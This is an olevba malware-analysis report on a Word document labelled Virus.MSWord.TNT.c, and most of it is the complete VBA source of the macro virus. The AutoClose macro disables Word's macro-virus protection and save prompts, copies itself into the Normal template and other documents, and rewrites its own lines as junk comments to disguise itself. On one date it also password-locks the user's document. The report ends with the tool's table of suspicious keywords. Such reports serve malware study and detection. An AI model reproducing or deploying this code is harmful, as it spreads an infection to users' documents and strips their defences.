olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TNT.c-99cbd039610c9e40c679f2b3fddb2189e3758a1e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TNT.c-99cbd039610c9e40c679f2b3fddb2189e3758a1e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'7@:$)H=:.(4-B$$)H=:4-B$$7@:$)
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String
'9<:&%J9:0$4-B$&%J9:4-B$&9<:&%
Randomize
'6<:#%G9:-$4-B$#%G9:4-B$#6<:#%
On Error GoTo 79
'>9?+"$O6?5!4-B$+"$O6?4-B$+>9?+"
Options.VirusProtection = Chr(48)
'=:A*#&N7A4"4-B$*#&N7A4-B$*=:A*#
Options.SaveNormalPrompt = Chr(48)
'>8;+! O5;5 4-B$+! O5;4-B$+>8;+!
Options.ConfirmConversions = Chr(48)
':8<'!!K5<1 4-B$'!!K5<4-B$':8<'!
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
':9<'"!K6<1!4-B$'"!K6<4-B$':9<'"
dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'7@:$)H=:.(4-B$$)H=:4-B$$7@:$)
If dt > 0 And rt > 0 Then GoTo 79
'68;#! G5;- 4-B$#! G5;4-B$#68;#!
If dt = 0 Then
'6>:#'G;:-&4-B$#'G;:4-B$#6>:#'
    Set Joy = NormalTemplate.VBProject.VBComponents
'89:%"I6:/!4-B$%"I6:4-B$%89:%"
    Set hst = ActiveDocument.VBProject.VBComponents
'<;:)$M8:3#4-B$)$M8:4-B$)<;:)$
    If Month(Now()) = 10 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'68;#! G5;- 4-B$#! G5;4-B$#68;#!
    If Month(Now()) = 11 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(74) + Chr(79) + Chr(89)
'68:#!G5:- 4-B$#!G5:4-B$#68:#!
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "Ultra.Joy"
'6:B##'G7B-"4-B$##'G7B4-B$#6:B##
    hst.Item(Abs(1)).Name = Joy.Item(Abs(1)).Name
'79<$"!H6<.!4-B$$"!H6<4-B$$79<$"
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
'69;#" G6;-!4-B$#" G6;4-B$#69;#"
End If
'7<;$% H9;.$4-B$$% H9;4-B$$7<;$%
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
'68:#!G5:- 4-B$#!G5:4-B$#68:#!
Joy.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(74) + Chr(79) + Chr(89)
'6;:#$G8:-#4-B$#$G8:4-B$#6;:#$
With Joy.Item(Abs(1)).codemodule
'7;;$$ H8;.#4-B$$$ H8;4-B$$7;;$$
    For j = Chr(49) To Chr(52)
'7<:$%H9:.$4-B$$%H9:4-B$$7<:$%
    .deletelines Chr(49)
'7:;$# H7;."4-B$$# H7;4-B$$7:;$#
    Next j
'6<:#%G9:-$4-B$#%G9:4-B$#6<:#%
    End With
'6:;## G7;-"4-B$## G7;4-B$#6:;##
If dt = 0 Then Joy.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'6<:#%G9:-$4-B$#%G9:4-B$#6<:#%
If dt = 0 Then Joy.Item(Abs(1)).codemodule.replaceline 85, "Sub ToolsMarco()"
'7;<$$!H8<.#4-B$$$!H8<4-B$$7;<$$
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'7:B$#'H7B."4-B$$#'H7B4-B$$7:B$#
With Joy.Item(Abs(1)).codemodule
'7:@$#%H7@."4-B$$#%H7@4-B$$7:@$#
   For j = Chr(50) To Joy.Item(Abs(1)).codemodule.countoflines Step Chr(50)
'7<;$% H9;.$4-B$$% H9;4-B$$7<;$%
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'79:$"H6:.!4-B$$"H6:4-B$$79:$"
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'68<#!!G5<- 4-B$#!!G5<4-B$#68<#!
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
'6>;#' G;;-&4-B$#' G;;4-B$#6>;#'
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'88:%!I5:/ 4-B$%!I5:4-B$%88:%!
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'8;;%$ I8;/#4-B$%$ I8;4-B$%8;;%$
    .replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & xoe & rex & ixn & oxe & exr & nix & rnl & xxe & xex & exx & exd & xoe & eox & rxe & nix & xoe & rex
'7<;$% H9;.$4-B$$% H9;4-B$$7<;$%
   Next j
'6<>#%#G9>-$4-B$#%#G9>4-B$#6<>#%
End With
';<;(% L9;2$4-B$(% L9;4-B$(;<;(%
79:
'79>$"#H6>.!4-B$$"#H6>4-B$$79>$"
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'<;:)$M8:3#4-B$)$M8:4-B$)<;:)$
End Sub
';8:(!L5:2 4-B$(!L5:4-B$(;8:(!
Sub ToolsMarco()
'7;;$$ H8;.#4-B$$$ H8;4-B$$7;;$$
End Sub
'9;:&$J8:0#4-B$&$J8:4-B$&9;:&$
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

